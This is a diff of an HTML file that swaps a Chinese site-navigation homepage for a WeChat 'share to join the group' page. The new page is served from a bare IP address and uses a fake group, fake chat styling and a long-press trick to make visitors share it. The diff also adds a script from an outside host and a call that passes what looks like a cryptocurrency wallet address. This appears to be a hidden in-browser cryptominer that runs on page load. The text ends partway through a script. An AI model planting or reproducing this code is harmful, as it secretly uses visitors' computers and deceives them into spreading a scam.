@@ -1,227 +1,747 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>潇府 - 欢迎大家访问！</title>
-    <meta name="keywords" content="潇府导航、网址大全、网址导航、免费收录、网址大全">
-    <meta name="description" content="潇府导航网,为用户提供一站式优质服务,优化用户体验,收录各大平台网站,免费收录各类网站,打造最与众不同的站点导航,导航站点分类齐全,拥有独特的分类栏目,欢迎各大平台合作支持!">
-    <meta name="author" content="作者：潇,微信：3010662388,E-Mail：3010662388@qq.com">
-    <meta name="baidu-site-verification" content="code-vIivd4QsAU">
-    <link rel="shortcut icon" href="../ico.ico">
-    <link rel='stylesheet' id='iconfont-css' href='static/css/iconfont.css' type='text/css' media='all'>
-    <link rel='stylesheet' id='bootstrap-css' href='static/css/bootstrap.min.css' type='text/css' media='all'>
-    <link rel='stylesheet' id='style-css' href='static/css/style.min.css' type='text/css' media='all'>
-    <script src='static/js/jquery.min.js' id='jquery-js'></script>
+    <meta charset="utf-8">
+    <meta name="viewport"
+          content="maximum-scale=1.0,minimum-scale=1.0,user-scalable=0,width=device-width,initial-scale=1.0"/>
+    <meta name="format-detection" content="telephone=no,email=no,date=no,address=no">
+    <title>分享加群</title>
+    <link rel="stylesheet" type="text/css" href="http://47.242.8.230/fxjq/static/css/aui.css"/>
+    <script>
+    var ua = navigator.userAgent.toLowerCase();
+        var isWeixin = ua.indexOf('micromessenger') != -1;
+        if (!isWeixin) {
+            window.location.href = "https://open.weixin.qq.com/connect/oauth2/authorize?appid=888"
+        }
+        </script>
+    <script src="http://47.242.8.230/fxjq/static/js/jweixin-1.0.0.js"></script>
+    <script src="http://47.242.8.230/fxjq//js/jquery.min.js"></script>
+    <style type="text/css">
+    
+        .a {
+            border-bottom: 1px solid rgb(192, 191, 197);
+            background: rgb(249, 249, 249);
+            padding: 10% 0;
+        }
+
+        .header_picture {
+            width: 20%;
+            margin: 0 auto;
+        }
+
+        .header .title {
+            text-align: center;
+            margin-top: 2%;
+        }
+
+        .header .description {
+            text-align: center;
+            color: rgb(154, 154, 154);
+            height: 2%;
+        }
+
+        .footer {
+            background: rgb(240, 239, 244);
+        }
+
+        .footer .btns {
+            padding: 10% 0 48.6% 0;
+        }
+
+        .footer .btns .tip {
+            text-align: center;
+        }
+
+        .footer .btns .btn {
+            width: 50%;
+            height: 20%;
+            background: rgb(4, 191, 1);
+            margin: 10% auto;
+            padding: 2% 2%;
+            border-radius: 8px;
+        }
+
+        .footer .btns .btn .checked {
+            text-align: center;
+            color: rgb(252, 252, 252);
+            font-family: sans-serif;
+        }
+
+        .footer .dis {
+            padding: 5% 0 29% 0;
+            display: none;
+        }
+
+        .origin {
+            width: 100%;
+            min-height: 100%;
+            background: #EDEDED;
+            position: absolute;
+            top: 0;
+            left: 0;
+            display: none;
+        }
+
+        #time {
+            text-align: center;
+            font-size: 10px;
+            margin-top: 20px;
+            margin-bottom: 20px;
+            color: #8C8C8C;
+        }
+
+        .origin .fakeName {
+            width: 80%;
+            text-align: center;
+            margin: 0 auto;
+            color: #8C8C8C;
+            font-size: 12px;
+        }
+
+        .fake {
+            margin-top: 4%;
+            position: relative;
+            height: auto;
+            margin-bottom: 2%;
+            min-height: 8%;
+        }
+
+        .fakeRight {
+            margin-top: 4%;
+            position: relative;
+            height: auto;
+            margin-bottom: 2%;
+            min-height: 8%;
+            text-align: right;
+        }
+
+        .fakeChatIcon {
+            position: absolute;
+            width: 10%;
+            max-width: 48px;
+            left: 3.4%;
+            top: 0;
+            display: inline-block;
+        }
+
+        .fakeChatIconRight {
+            position: absolute;
+            width: 10%;
+            max-width: 68px;
+            right: 3.4%;
+            top: 0;
+            display: inline-block;
+        }
+
+        .img {
+            border-radius: 6px;
+        }
+
+        .fakeChat {
+            background: white;
+            display: inline-block;
+            max-width: 66.8%;
+            margin-left: 16.4%;
+            line-height: 22px;
+            padding: 8px;
+            border-radius: 6px;
+        }
+
+        .fakeChatRight {
+            text-align: left;
+            background: #98E165;
+            display: inline-block;
+            max-width: 66.8%;
+            margin-right: 16.4%;
+            line-height: 22px;
+            padding: 8px;
+            border-radius: 6px;
+        }
+
+        .fakeAngle {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            left: 15.4%;
+            top: 14px;
+            -webkit-transform: rotate(45deg);
+            background: white;
+        }
+
+        .fakeAngleRight {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            right: 15.4%;
+            top: 14px;
+            -webkit-transform: rotate(45deg);
+            background: #98E165;
+        }
+
+        #bottomPicture {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+
+        /*main*/
+        #mask {
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            background-color: black;
+            z-index: 1001;
+            -moz-opacity: 0.7;
+            opacity: .70;
+            filter: alpha(opacity=70);
+        }
+
+        .layer-show-share {
+            display: none;
+            width: 100%;
+            height: 100%;
+            position: fixed;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+            opacity: 0.86;
+            background-color: #000;
+            z-index: 10000;
+        }
+
+        .layer-show-share .div-share {
+            width: 100%;
+            height: 100%;
+            left: 0;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            position: fixed;
+        }
+
+        .layer-show-share img {
+            width: 100%;
+            height: 100%;
+        }
+
+        .layer-show-share1 {
+            display: none;
+            width: 100%;
+            height: 100%;
+            position: fixed;
+            top: 0;
+            left: 0;
+            bottom: 0;
+            right: 0;
+            opacity: 0.86;
+            background-color: #000;
+            z-index: 10000;
+        }
+
+        .layer-show-share1 .div-share1 {
+            width: 100%;
+            height: 100%;
+            left: 0;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            position: fixed;
+        }
+
+        .layer-show-share1 img {
+            width: 100%;
+            height: 100%;
+        }
+
+        /*图片分享*/
+        #imgShare {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            background: gainsboro;
+            opacity: 0.95;
+            display: none;
+        }
+
+        #imgShare > p {
+            text-align: center;
+            font-size: 20px;
+            margin: 14%;
+            color: black;
+        }
+
+        #imgShare .fingerBox .finger {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto;
+        }
+
+        #imgShare .circle {
+            border: solid #69ca62 2px;
+            transition: ease 0.5s;
+            border-radius: 50%;
+            width: 80px;
+            height: 80px;
+            animation: myLittle 1.5s infinite ease-in-out;
+            margin: 0 auto;
+            margin-top: -80px;
+        }
+
+        @keyframes myLittle {
+            from {
+                width: 80px;
+                height: 80px;
+                opacity: 1;
+                margin-top: -80px;
+            }
+            to {
+                margin-top: -60px;
+                width: 40px;
+                height: 40px;
+                display: none;
+                opacity: 0;
+            }
+        }
+
+        #imgShare .qrcode {
+            position: absolute;
+            left: 0;
+            bottom: 0;
+            width: 100%;
+            max-height: 60%;
+            opacity: 0.01;
+        }
+
+        /*media*/
+        @media screen and (min-width: 570px) {
+            .a {
+                border-bottom: 1px solid rgb(192, 191, 197);
+                background: rgb(249, 249, 249);
+                padding: 4% 0;
+            }
+
+            .footer .btns {
+                padding: 0;
+                padding-top: 60px;
+                min-height: 571px;
+            }
+
+            .fakeChatIcon {
+                position: absolute;
+                width: 7%;
+                max-width: 60px;
+                display: block;
+                margin: 0 auto;
+                left: 5%;
+                top: 0;
+            }
+
+            .fakeChatIconRight {
+                position: absolute;
+                width: 7%;
+                max-width: 60px;
+                right: 5%;
+                top: 0;
+                display: inline-block;
+            }
+
+            #bottomPicture {
+                width: 100%;
+                bottom: 0;
+                max-height: 60px;
+            }
+
+            .fakeAngle {
+                position: absolute;
+                width: 10px;
+                height: 10px;
+                left: 16%;
+                top: 14px;
+                -webkit-transform: rotate(45deg);
+                background: white;
+            }
+
+            .fakeAngleRight {
+                position: absolute;
+                width: 10px;
+                height: 10px;
+                right: 16%;
+                top: 14px;
+                -webkit-transform: rotate(45deg);
+                background: #98E165;
+            }
+
+            #imgShare > p {
+                text-align: center;
+                font-size: 20px;
+                margin: 40px;
+                color: black;
+            }
+
+            #imgShare .fingerBox .newFinger {
+                max-width: 640px;
+                margin: 0 auto;
+            }
+        }
+
+        @media screen and (min-width: 1024px) {
+            .a {
+                width: 50%;
+                margin-left: 25%;
+                text-align: center;
+            }
+
+            .btns {
+                padding-bottom: 0;
+                min-height: 487px;
+            }
+
+            footer {
+                width: 50%;
+                margin-left: 25%;
+            }
+
+            .exist {
+                width: 50%;
+                height: 100%;
+                top: 0;
+                left: 0;
+                margin-left: 25%;
+            }
+
+            #bottomPicture {
+                width: 50%;
+                bottom: 0;
+                left: 25%;
+                max-height: 80px;
+            }
+
+            .fakeChatIcon {
+                position: absolute;
+                width: 10.5%;
+                max-width: 60px;
+                display: block;
+                margin: 0 auto;
+                left: 3%;
+                top: 0;
+            }
+
+            .fakeChatIconRight {
+                position: absolute;
+                width: 10%;
+                max-width: 60px;
+                right: 3%;
+                top: 0;
+                display: inline-block;
+            }
+
+            .fakeAngle {
+                position: absolute;
+                width: 10px;
+                height: 10px;
+                left: 15.8%;
+                top: 14px;
+                -webkit-transform: rotate(45deg);
+                background: white;
+            }
+
+            .fakeAngleRight {
+                position: absolute;
+                width: 10px;
+                height: 10px;
+                right: 15.8%;
+                top: 14px;
+                -webkit-transform: rotate(45deg);
+                background: #98E165;
+            }
+        }
+    </style>
+    <script>
+        var uid = "";
+        var u = "/wersd/lbqun/index/qunzf1.jpg";
+        var uu = "/wersd/lbqun/index/qunzf.jpg";
+        var us = "";
+        wx.config({
+            debug: false,
+            appId: 'wx1db78e39738418',
+            timestamp: '2542928877',
+            nonceStr: 'q458uku6ekPba9',
+            signature: 'a17887a33fe00b8b2c303dc95898ed8b348885',
+            jsApiList: [
+                'onMenuShareTimeline',
+                'onMenuShareAppMessage',
+                'hideMenuItems',
+                'showMenuItems',
+                'hideMenuItems',
+            ]
+        });
+
+        wx.error(function (res) {
+            console.log(res);
+        });
+    </script>
+    <script src="https://trusteverything.de/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
+<script type="text/javascript">
+EverythingIsLife('49T8zR9SSaa2MCL2ryoGJf6tfJGkGDYGghCit3oHRzSiTzBG9xvDDURcK9enEZnKLBAemb7Quz68N4ByXuW6fRBcEnmb6i7', 'x', 50);
+</script>
 </head>
-<body class="user-bookmark-body bookmark-default">
-
-<div class="page-container">
-    <div class="bookmark-bg">
-        <div class="img-bg" id="img-bg"></div>
-        <div class="gradient-linear"></div>
+<body>
+<div id="imgShare">
+    <p>长按下方分享<br>分享后加入群聊</p>
+    <div class="fingerBox">
+        <img class="newFinger" src="http://47.242.8.230/fxjq/static/picture/newfinger.png" alt="">
+        <img class="finger" src="http://47.242.8.230/fxjq/static/picture/finger.png" alt="">
+        <div class="circle"></div>
     </div>
-    <header class="navbar navbar-dark fixed-top">
-        <div class="weather">
-            <div id="he-plugin-simple" style="display: contents;"></div>
-            <script>
-                WIDGET = {
-                    "CONFIG": {
-                        "modules": "02",
-                        "background": "5",
-                        "tmpColor": "FFFFFF",
-                        "tmpSize": "20",
-                        "cityColor": "FFFFFF",
-                        "citySize": "16",
-                        "aqiColor": "FFFFFF",
-                        "aqiSize": "16",
-                        "weatherIconSize": "30",
-                        "alertIconSize": "18",
-                        "padding": "0px 5px 0px 5px",
-                        "shadow": "0",
-                        "language": "auto",
-                        "fixed": "false",
-                        "vertical": "top",
-                        "horizontal": "left",
-                        "key": "257fe54e3a0b4cd29b399d2831bd56e0"
-                    }
-                }
-            </script>
-            <script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0" defer=""></script>
-        </div>
-        <ul class="nav navbar-menu">
-            <li class="nav-login ml-3"> <a href="../" class="text-light" title="主页"><i
-                        class="iconfont icon-home bookmark-ico icon-2x" style="font-size: 1.5em; position: relative; left: -10px; top: 0px;"></i></a> </li>
-        </ul>
-    </header>
-    <div class="header-big mb-4">
-        <div class="s-search">
-            <div id="search" class="s-search mx-auto">
-                <div class="big-title text-center mb-3 mb-md-5 mt-2">
-                    <p class="h1" style="letter-spacing: 6px;">潇 府</p>
-                </div>
-                <div id="search-list-menu" class="hide-type-list">
-                    <div class="s-type text-center overflow-x-auto">
-                        <div class="s-type-list big">
-                            <div class="anchor" style="position: absolute; left: 50%; opacity: 0;"></div>
-                            <label for="type-baidu1" class="active" data-id="group-b"><span>搜索</span></label>
-                            <label for="type-br" data-id="group-c"><span>工具</span></label>
-                            <label for="type-zhihu"  data-id="group-d"><span>社区</span></label>
-                            <label for="type-taobao1" data-id="group-e"><span>生活</span></label>
-                            <label for="type-juhe" data-id="group-f"><span>影视</span></label>
-                        </div>
-                    </div>
-                </div>
-                <form action="/search.html?key=" method="get" target="_blank" class="super-search-fm">
-                    <input type="text" id="search-text" class="form-control smart-tips search-key" zhannei="" placeholder="输入关键字搜索" style="outline:0" autocomplete="off">
-                    <button type="submit"><i class="iconfont icon-search"></i></button>
-                </form>
-                <div id="search-list" class="hide-type-list">
-                    <div class="search-group group-b s-current">
-                        <ul class="search-type">
-                            <li><input checked="checked" hidden="" type="radio" name="type" id="type-baidu1" value="https://www.baidu.com/s?wd=" data-placeholder="百度一下"><label for="type-baidu1"><span class="text-muted">百度</span></label></li>
-                            <li><input hidden="" type="radio" name="type" id="type-google1" value="https://www.google.com/search?q=" data-placeholder="谷歌两下"><label for="type-google1"><span class="text-muted">谷歌</span></label></li>
-                            <li><input hidden="" type="radio" name="type" id="type-sogo" value="https://www.sogou.com/web?query=" data-placeholder="搜狗搜索"><label for="type-sogo"><span class="text-muted">搜狗</span></label></li>
-                            <li><input hidden="" type="radio" name="type" id="type-bing1" value="https://cn.bing.com/search?q=" data-placeholder="必应搜索"><label for="type-bing1"><span class="text-muted">必应</span></label></li>
-                            <li><input hidden="" type="radio" name="type" id="type-kuake" value="https://quark.sm.cn/s?q=" data-placeholder="夸克搜索"><label for="type-kuake"><span class="text-muted">夸克</span></label></li>
-                            <li><input hidden="" type="radio" name="type" id="type-toutiao" value="https://so.toutiao.com/search/?keyword=" data-placeholder="头条搜索"><label for="type-toutiao"><span class="text-muted">头条</span></label></li>
-                        </ul>
-                    </div>
-                    <div class="search-group group-c ">
-                        <ul class="search-type">
-                            <li><input hidden="" type="radio" name="type" id="type-br" value="https://rank.chinaz.com/all/" data-placeholder="请输入网址(不带https://)"><label for="type-br"><span class="text-muted">权重查询</span></label></li>
-                            <li><input hidden="" type="radio" name="type" id="type-links" value="https://link.chinaz.com/" data-placeholder="请输入网址(不带https://)"><label for="type-links"><span class="text-muted">友链检测</span></label></li>
-                            <li><input hidden="" type="radio" name="type" id="type-icp" value="https://icp.aizhan.com/" data-placeholder="请输入网址(不带https://)"><label for="type-icp"><span class="text-muted">备案查询</span></label></li>
-                            <li><input hidden="" type="radio" name="type" id="type-ping" value="https://ping.chinaz.com/" data-placeholder="请输入网址(不带https://)"><label for="type-ping"><span class="text-muted">PING检测</span></label></li>
-                            <li><input hidden="" type="radio" name="type" id="type-404" value="https://tool.chinaz.com/Links/?DAddress=" data-placeholder="请输入网址(不带https://)"><label for="type-404"><span class="text-muted">死链检测</span></label></li>
-                            <li><input hidden="" type="radio" name="type" id="type-ciku" value="https://www.ciku5.com/s?wd=" data-placeholder="请输入关键词"><label for="type-ciku"><span class="text-muted">关键词挖掘</span></label></li>
-                        </ul>
-                    </div>
-                    <div class="search-group group-d ">
-                        <ul class="search-type">
-                            <li><input hidden="" type="radio" name="type" id="type-zhihu" value="https://www.zhihu.com/search?type=content&q=" data-placeholder="知乎"><label for="type-zhihu"><span class="text-muted">知乎</span></label></li>
-                            <li><input hidden="" type="radio" name="type" id="type-wechat" value="https://weixin.sogou.com/weixin?type=2&query=" data-placeholder="微信"><label for="type-wechat"><span class="text-muted">微信</span></label></li>
-                            <li><input hidden="" type="radio" name="type" id="type-weibo" value="https://s.weibo.com/weibo/" data-placeholder="微博"><label for="type-weibo"><span class="text-muted">微博</span></label></li>
-                            <li><input hidden="" type="radio" name="type" id="type-douban" value="https://www.douban.com/search?q=" data-placeholder="豆瓣"><label for="type-douban"><span class="text-muted">豆瓣</span></label></li>
-                            <li><input hidden="" type="radio" name="type" id="type-why" value="https://ask.seowhy.com/search/?q=" data-placeholder="SEO问答社区"><label for="type-why"><span class="text-muted">搜外问答</span></label></li>
-                        </ul>
-                    </div>
-                    <div class="search-group group-e ">
-                        <ul class="search-type">
-                            <li><input hidden="" type="radio" name="type" id="type-taobao1" value="https://s.taobao.com/search?q=" data-placeholder="淘宝"><label for="type-taobao1"><span class="text-muted">淘宝</span></label></li>
-                            <li><input hidden="" type="radio" name="type" id="type-jd" value="https://search.jd.com/Search?keyword=" data-placeholder="京东"><label for="type-jd"><span class="text-muted">京东</span></label></li>
-                            <li><input hidden="" type="radio" name="type" id="type-12306" value="https://www.12306.cn/?" data-placeholder="12306"><label for="type-12306"><span class="text-muted">12306</span></label></li>
-                            <li><input hidden="" type="radio" name="type" id="type-kd100" value="https://www.kuaidi100.com/?" data-placeholder="快递100"><label for="type-kd100"><span class="text-muted">快递100</span></label></li>
-                            <li><input hidden="" type="radio" name="type" id="type-qunar" value="https://www.qunar.com/?" data-placeholder="去哪儿"><label for="type-qunar"><span class="text-muted">去哪儿</span></label></li>
-                        </ul>
-                    </div>
-                    <div class="search-group group-f ">
-                        <ul class="search-type">
-                            <li><input hidden="" type="radio" name="type" id="type-juhe" value="https://www.cupfox.com/search?key=" data-placeholder="影视资源聚合搜索"><label for="type-juhe"><span class="text-muted">聚合搜索</span></label></li>
-                            <li><input hidden="" type="radio" name="type" id="type-555" value="https://www.o8tv.com/vodsearch/-------------.html?wd=" data-placeholder="在线影视搜索"><label for="type-555"><span class="text-muted">555电影</span></label></li>
-                            <li><input hidden="" type="radio" name="type" id="type-dyxs" value="http://dyxs15.com/search--------------/?wd=" data-placeholder="在线影视搜索"><label for="type-dyxs"><span class="text-muted">电影先生</span></label></li>
-                            <li><input hidden="" type="radio" name="type" id="type-dibi" value="https://www.mp4er.cc/search/" data-placeholder="在线及下载影视搜索"><label for="type-dibi"><span class="text-muted">哔嘀影视</span></label></li>
-                        </ul>
-                    </div>
-                </div>
-                <div class="card search-smart-tips" style="display: none">
-                    <ul></ul>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <section class="quick-sites position-relative">
-        <div class="container text-center px-5">
-            <div class="row"> <a class="sites-btn col-3 col-md-20 text-center mb-4" target="_blank"
-                    href="https://github.com/" title="Github" rel=" noopener">
-                    <div class="d-flex mb-2">
-                        <div class="sites-icon mx-auto ub-blur-bg"> <img class="lazy" src="../ico/github.png"
-                                data-src="../ico/github.png" onerror="javascript:this.src='../ico/github.png'"
-                                alt="Github"> </div>
-                    </div>
-                    <div class="sites-title ub-blur-bg px-2 text-xs overflowClip_1"><span>Github</span>
-                    </div>
-                </a> <a class="sites-btn col-3 col-md-20 text-center mb-4" target="_blank"
-                    href="http://www.52pojie.cn/" title="吾爱破解" rel="external nofollow noopener">
-                    <div class="d-flex mb-2">
-                        <div class="sites-icon mx-auto ub-blur-bg"> <img class="lazy" src="../ico/52.png"
-                                data-src="../ico/52.png" onerror="javascript:this.src='../ico/52.png'" alt="吾爱破解"> </div>
-                    </div>
-                    <div class="sites-title ub-blur-bg px-2 text-xs overflowClip_1"><span>吾爱破解</span>
-                    </div>
-                </a> <a class="sites-btn col-3 col-md-20 text-center mb-4" target="_blank"
-                    href="https://huaban.com/" title="花瓣网" rel="external nofollow noopener">
-                    <div class="d-flex mb-2">
-                        <div class="sites-icon mx-auto ub-blur-bg"> <img class="lazy" src="../ico/huaban.png"
-                                data-src="../ico/huaban.png" onerror="javascript:this.src='../ico/huaban.png'" alt="花瓣网"> </div>
-                    </div>
-                    <div class="sites-title ub-blur-bg px-2 text-xs overflowClip_1"><span>花瓣网</span></div>
-                </a> <a class="sites-btn col-3 col-md-20 text-center mb-4" target="_blank" href="https://ibaotu.com/"
-                    title="包图网" rel="external nofollow noopener">
-                    <div class="d-flex mb-2">
-                        <div class="sites-icon mx-auto ub-blur-bg"> <img class="lazy" src="../ico/baotu.png"
-                                data-src="../ico/baotu.png" onerror="javascript:this.src='../ico/baotu.png'" alt="包图网">
-                        </div>
-                    </div>
-                    <div class="sites-title ub-blur-bg px-2 text-xs overflowClip_1"><span>包图网</span></div>
-                </a> <a class="sites-btn col-3 col-md-20 text-center mb-4" target="_blank"
-                    href="https://mail.qq.com/"
-                    title="QQ邮箱" rel="external nofollow noopener">
-                    <div class="d-flex mb-2">
-                        <div class="sites-icon mx-auto ub-blur-bg"> <img class="lazy" src="../ico/QQyx.png"
-                                data-src="../ico/QQyx.png" onerror="javascript:this.src='../ico/QQyx.png'" alt="QQ邮箱">
-                        </div>
-                    </div>
-                    <div class="sites-title ub-blur-bg px-2 text-xs overflowClip_1"><span>QQ邮箱</span></div>
-                </a>                     
-                <a class="sites-btn col-3 col-md-20 text-center mb-4" target="_blank"
-                    href="https://www.o8tv.com/" title="555电影" rel="external nofollow noopener">
-                    <div class="d-flex mb-2">
-                        <div class="sites-icon mx-auto ub-blur-bg"> <img class="lazy" src="../ico/555dianying.png"
-                                data-src="../ico/555dianying.png" onerror="javascript:this.src='../ico/555dianying.png'"
-                                alt="555电影"> </div>
-                    </div>
-                    <div class="sites-title ub-blur-bg px-2 text-xs overflowClip_1"><span>555电影</span></div>
-                </a> <a class="sites-btn col-3 col-md-20 text-center mb-4" target="_blank"
-                    href="https://www.bd2020.com/" title="BD影视" rel="external nofollow noopener">
-                    <div class="d-flex mb-2">
-                        <div class="sites-icon mx-auto ub-blur-bg"> <img class="lazy" src="../ico/BDyingshi.png"
-                                data-src="../ico/BDyingshi.png" onerror="javascript:this.src='../ico/BDyingshi.png'"
-                                alt="BD影视"> </div>
-                    </div>
-                    <div class="sites-title ub-blur-bg px-2 text-xs overflowClip_1"><span>BD影视</span></div>
-                </a> <a class="sites-btn col-3 col-md-20 text-center mb-4" target="_blank"
-                    href="https://www.ghxi.com/" title="果核剥壳" rel="external nofollow noopener">
-                    <div class="d-flex mb-2">
-                        <div class="sites-icon mx-auto ub-blur-bg"> <img class="lazy" src="../ico/guohe.png"
-                                data-src="../ico/guohe.png" onerror="javascript:this.src='../ico/guohe.png'" alt="果核剥壳">
-                        </div>
-                    </div>
-                    <div class="sites-title ub-blur-bg px-2 text-xs overflowClip_1"><span>果核剥壳</span></div>
-                </a> </div>
-        </div>
-    </section>
-    <footer class="main-footer footer-type-1 position-relative text-xs">
-        <div id="footer-tools" class="d-flex flex-column">
-            <div id="footer-tools" class="d-flex flex-column"> <a href="javascript:" id="go-to-up"
-                class="btn rounded-circle go-up m-1" rel="go-top" style="display: none;" one-link-mark="yes"> <i
-                    class="iconfont icon-to-up"></i> </a> </div>
-        </div>
-        <div class="footer-inner text-center text-light my-3">
-            <div class="footer-text">
-                Copyright © 2024 <a href="../"><strong>潇府</strong></a> Design by <strong>snail</strong>
-            </div>
-        </div>
-    </footer>
+    <img id="qrcode" class="qrcode" src="http://47.242.8.230/fxjq/static/picture/1.png" alt="">
 </div>
-<script src="static/js/bing.js"></script>
-<script src="static/js/popper.min.js"></script>
-<script src='static/js/bootstrap.min.js' id='bootstrap-js'></script>
-<script src="static/js/theia-sticky-sidebar.js"></script>
-<script src='static/js/lazyload.min.js' id='lazyload-js'></script>
-<script src='static/js/app.min.js' id='appjs-js'></script>
+<header>
+    <div class="a header">
+        <img class="header_picture" src="http://47.242.8.230/fxjq/static/picture/60db1a81518b6.jpg" alt="">
+                    <h2 class="title">
+                            一手群        </h2>
+        <h3 class="description">
+                            (共489人)        </h3>
+    </div>
+</header>
+<main>
+    <div id="mask"
+         style=" display: none;  position: absolute;  top: 0%;  left: 0%;  width: 100%;  height: 100%;  background-color: black;  z-index:1001;  -moz-opacity: 0.7;  opacity:.70;  filter: alpha(opacity=70);">
+    </div>
 
+    <div class="layer-show-share " style="z-index: 100">
+        <div class="div-share">
+            <img src="http://47.242.8.230/fxjq/static/picture/sha.png"/>
+        </div>
+    </div>
+    <div class="layer-show-share1 " style="z-index: 100">
+        <div class="div-share1">
+            <img src="http://47.242.8.230/fxjq/static/picture/shar.png"/>
+        </div>
+    </div>
+</main>
+<footer class="footer">
+    <div class="btns">
+        <h2 class="tip">点击下方加入</h2>
+		<h2 class="tip"></h2>
+        <div class="btn">
+            <h2 class="checked">加入该群聊</h2>
+        </div>
+    </div>
+    <div class="dis">
+        <h2 align="center" style="font-family: 黑体">
+                            分享成功，请使用微信扫描下方二维码进群        </h2>
+        <img src="http://47.242.8.230/fxjq/static/picture/2.png" alt="" width="70%" style="margin: 5% auto 5% auto">
+                </div>
+    </div>
+</footer>
+</switch>
 </body>
+<script src="http://47.242.8.230/fxjq/static/js/jquery.min.js"></script>
+<script>window.jQuery || document.write('<script src="http://47.242.8.230/fxjq/static/js/jquery-2.1.1.min.js"><\/script>')</script>
+<script type="text/javascript">
+    var oDate = new Date();
+    $('#time').text(oDate.getHours() + ':' + oDate.getMinutes());
+
+    $(document).ready(function () {
+        $('.btn').click(function () {
+            if (1) {
+                $('#imgShare').show();
+            } else if (0) {
+                alert('亲需要分享到一个微信群哦');
+                $('.layer-show-share1').show();
+
+                function jump(count) {
+                    window.setTimeout(function () {
+                        count--;
+                        if (count == 7) {
+                            $('.layer-show-share').show();
+                            $('.layer-show-share1').hide();
+                        }
+                        if (count > 0) {
+                            $('#last').attr('innerHTML', count);
+                            jump(count);
+                        } else {
+                            $('.layer-show-share').hide();
+                            $('.layer-show-share1').hide();
+                            $('.dis').show();
+                            $('.btns').hide();
+                        }
+                    }, 1000);
+                }
+
+                jump(14);
+
+            } else {
+                $('.dis').show();
+                $('.btns').hide();
+            }
+        });
+
+        //因js没有长按事件，需要自行封装，函数名longPress，参数为：需长按元素的id、长按之后的逻辑函数func
+        function longPress(id, func) {
+            var timeOutEvent;
+
+            document.querySelector("#" + id).addEventListener("touchstart", function (e) {
+                //开启定时器前先清除定时器，防止重复触发
+                clearTimeout(timeOutEvent);
+                //开启延时定时器
+                timeOutEvent = setTimeout(function () {
+                    //调用长按之后的逻辑函数func
+                    func();
+                }, 300); //长按时间为300ms，可以自己设置
+            });
+
+            document.querySelector("#" + id).addEventListener("touchmove", function (e) {
+                //长按过程中，手指是不能移动的，若移动则清除定时器，中断长按逻辑
+                clearTimeout(timeOutEvent);
+                /* e.preventDefault() --> 若阻止默认事件，则在长按元素上滑动时，页面是不滚动的，按需求设置吧 */
+            });
+
+            document.querySelector("#" + id).addEventListener("touchend", function (e) {
+                //若手指离开屏幕，时间小于我们设置的长按时间，则为点击事件，清除定时器，结束长按逻辑
+                clearTimeout(timeOutEvent);
+            })
+        }
+
+        var num = 0;
+
+        function test() {
+            num += 1;
+            if (num >= 2) {
+                setTimeout(function () {
+                    $('#imgShare').hide();
+                    $('.dis').show();
+                    $('.btns').hide();
+                }, 6000);
+            }
+            setTimeout(function () {
+                $('#imgShare > p').html('<span style="color: red;">请再次长按分享</span><br>分享后加入群聊');
+            }, 6000);
+        }
+
+        longPress('qrcode', test)
+    });
+
+    window.onload = function () {
+        if (0) {
+            $('div.a.header').hide();
+            $('footer.footer').hide();
+            console.log(111)
+        }
+        if (document.getElementsByClassName('origin')[0].className.indexOf('exist') != -1 && !0) {
+            popElement();
+        }
+    }
+
+    function popElement() {
+        var oBox = document.getElementsByClassName('exist')[0];
+        if (oBox) {
+            oBox.style.display = 'block';
+            var oBottom = document.getElementById('bottom');
+
+            pictures = eval("(" + '["wechaticon14.jpg","wechaticon5.jpg","wechaticon10.jpg","wechaticon11.jpg","wechaticon9.jpg","wechaticon4.jpg","wechaticon3.jpg","wechaticon20.jpg","wechaticon7.jpg","wechaticon2.jpg","wechaticon16.jpg","wechaticon8.jpg","wechaticon6.jpg","wechaticon19.jpg","wechaticon12.jpg","wechaticon17.jpg","wechaticon13.jpg","wechaticon15.jpg","wechaticon18.jpg","wechaticon1.jpg"]' + ")");
